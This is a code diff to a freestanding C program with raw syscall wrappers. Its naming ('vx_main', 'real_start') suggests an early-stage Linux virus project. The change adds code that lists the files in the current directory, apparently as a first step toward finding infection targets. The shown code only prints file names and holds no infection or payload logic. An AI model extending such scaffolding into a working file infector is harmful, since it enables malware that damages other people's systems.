@@ -5,9 +5,11 @@
 #include<sys/stat.h>
 #include<sys/mman.h>
 #include<linux/limits.h>
+#include <fcntl.h>
 
 #define STDOUT STDOUT_FILENO
 #define FAILURE -1
+#define SUCCESS 0
 
 extern unsigned long real_start;
 
@@ -78,15 +80,46 @@ int _start() {
 
 void vx_main()
 {
-	char *cwd;
+	char *cwd = NULL;
+	char *cwd_listings = NULL;
+
+	struct linux_dirent *d;
+	int cwd_fd, nread, status = SUCCESS;
+	const size_t DIR_LISTING_SIZE = 5000;
+
 	if(!(cwd = anansi_malloc(PATH_MAX))) {
-		anansi_exit(FAILURE);
+		status = FAILURE;
+		goto clean_up;
+	}
+
+	if(!(cwd_listings = anansi_malloc(DIR_LISTING_SIZE))) {
+		status = FAILURE;
+		goto clean_up;
 	}
 
 	anansi_getcwd(cwd, PATH_MAX);
-	anansi_write(STDOUT, cwd, anansi_strlen(cwd));
-	anansi_munmap(cwd, PATH_MAX);
-	anansi_exit(0);
+	if((cwd_fd = anansi_open(cwd, O_RDONLY | O_DIRECTORY, 0)) < 0) {
+		status = FAILURE;
+		goto clean_up;
+	}
+
+	nread = anansi_getdents64(cwd_fd, cwd_listings, DIR_LISTING_SIZE);
+	d = (struct linux_dirent *)cwd_listings;
+
+	for(long entry = 0; entry < nread; entry += d->d_reclen) {
+		d = (struct linux_dirent *) (cwd_listings + entry);
+		if(d->d_name[0] == '.' )
+			continue;
+		anansi_write(STDOUT, d->d_name, anansi_strlen(d->d_name));
+		anansi_write(STDOUT, "\n", 1);
+	}
+
+clean_up:
+	if(cwd != NULL)
+		anansi_munmap(cwd, PATH_MAX);
+	if(cwd_listings != NULL)
+		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
+	anansi_exit(status);
 }
 
 size_t anansi_strlen(const char *s)
